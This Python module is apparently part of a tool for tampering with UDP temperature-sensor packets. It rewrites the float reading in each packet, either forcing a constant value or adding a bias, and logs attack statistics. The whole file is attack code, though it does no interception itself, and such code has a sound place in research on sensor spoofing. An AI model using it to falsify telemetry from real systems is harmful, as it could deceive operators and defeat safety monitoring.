#!/usr/bin/env python3
"""
Packet Handler Module
Handles modification of UDP temperature packets
"""

import struct
from utils.logger import setup_logger

class PacketHandler:
    def __init__(self, attack_type, target_temp=None, bias=None):
        self.attack_type = attack_type
        self.target_temp = target_temp
        self.bias = bias
        self.logger = setup_logger('packet_handler', level='INFO')
        
        # Statistics
        self.packets_processed = 0
        self.total_original_temp = 0.0
        self.total_modified_temp = 0.0
        
        self.logger.info(f"🎯 Attack type: {attack_type}")
        if attack_type == 'constant':
            self.logger.info(f"🌡️ Target temperature: {target_temp}°C")
        elif attack_type == 'bias':
            self.logger.info(f"📈 Temperature bias: {bias}°C")
            
    def modify_temperature(self, original_temp):
        """Modify temperature based on attack type"""
        try:
            if self.attack_type == 'constant':
                modified_temp = self._constant_attack(original_temp)
            elif self.attack_type == 'bias':
                modified_temp = self._bias_attack(original_temp)
            else:
                self.logger.error(f"❌ Unknown attack type: {self.attack_type}")
                return original_temp
                
            # Update statistics
            self.packets_processed += 1
            self.total_original_temp += original_temp
            self.total_modified_temp += modified_temp
            
            return modified_temp
            
        except Exception as e:
            self.logger.error(f"❌ Temperature modification error: {e}")
            return original_temp
            
    def _constant_attack(self, original_temp):
        """Force temperature to a constant value"""
        if self.target_temp is None:
            self.logger.error("❌ Target temperature not set for constant attack")
            return original_temp
            
        return float(self.target_temp)
        
    def _bias_attack(self, original_temp):
        """Add bias to temperature"""
        if self.bias is None:
            self.logger.error("❌ Bias not set for bias attack")
            return original_temp
            
        return original_temp + float(self.bias)
        
    def modify_packet(self, packet_data):
        """Modify UDP packet containing temperature data"""
        try:
            if len(packet_data) < 4:
                self.logger.warning("⚠️ Packet too short, cannot modify")
                return packet_data
                
            # Extract original temperature (first 4 bytes, little-endian float)
            original_temp = struct.unpack('<f', packet_data[:4])[0]
            
            # Modify temperature
            modified_temp = self.modify_temperature(original_temp)
            
            # Create modified packet
            modified_packet = struct.pack('<f', modified_temp) + packet_data[4:]
            
            self.logger.debug(f"📦 Packet modified: {original_temp:.1f}°C → {modified_temp:.1f}°C")
            
            return modified_packet
            
        except Exception as e:
            self.logger.error(f"❌ Packet modification error: {e}")
            return packet_data
            
    def validate_temperature(self, temp):
        """Validate temperature value"""
        try:
            temp_float = float(temp)
            
            # Check for reasonable temperature range (-50°C to 150°C)
            if temp_float < -50 or temp_float > 150:
                self.logger.warning(f"⚠️ Temperature {temp_float}°C is outside normal range")
                
            return temp_float
            
        except (ValueError, TypeError):
            self.logger.error(f"❌ Invalid temperature value: {temp}")
            return 25.0  # Default fallback
            
    def get_attack_description(self):
        """Get human-readable attack description"""
        if self.attack_type == 'constant':
            return f"Constant temperature attack: forcing all readings to {self.target_temp}°C"
        elif self.attack_type == 'bias':
            return f"Bias attack: adding {self.bias}°C to all temperature readings"
        else:
            return f"Unknown attack type: {self.attack_type}"
            
    def get_statistics(self):
        """Get attack statistics"""
        avg_original = 0
        avg_modified = 0
        
        if self.packets_processed > 0:
            avg_original = self.total_original_temp / self.packets_processed
            avg_modified = self.total_modified_temp / self.packets_processed
            
        return {
            'attack_type': self.attack_type,
            'packets_processed': self.packets_processed,
            'average_original_temp': avg_original,
            'average_modified_temp': avg_modified,
            'total_modification': self.total_modified_temp - self.total_original_temp,
            'target_temp': self.target_temp,
            'bias': self.bias
        }
        
    def reset_statistics(self):
        """Reset attack statistics"""
        self.packets_processed = 0
        self.total_original_temp = 0.0
        self.total_modified_temp = 0.0
        self.logger.info("📊 Statistics reset")
        
    def print_statistics(self):
        """Print current attack statistics"""
        stats = self.get_statistics()
        
        self.logger.info("📊 Attack Statistics:")
        self.logger.info(f"   Attack Type: {stats['attack_type']}")
        self.logger.info(f"   Packets Processed: {stats['packets_processed']}")
        self.logger.info(f"   Average Original Temp: {stats['average_original_temp']:.1f}°C")
        self.logger.info(f"   Average Modified Temp: {stats['average_modified_temp']:.1f}°C")
        self.logger.info(f"   Total Modification: {stats['total_modification']:.1f}°C")
        
        if stats['attack_type'] == 'constant':
            self.logger.info(f"   Target Temperature: {stats['target_temp']}°C")
        elif stats['attack_type'] == 'bias':
            self.logger.info(f"   Temperature Bias: {stats['bias']}°C")
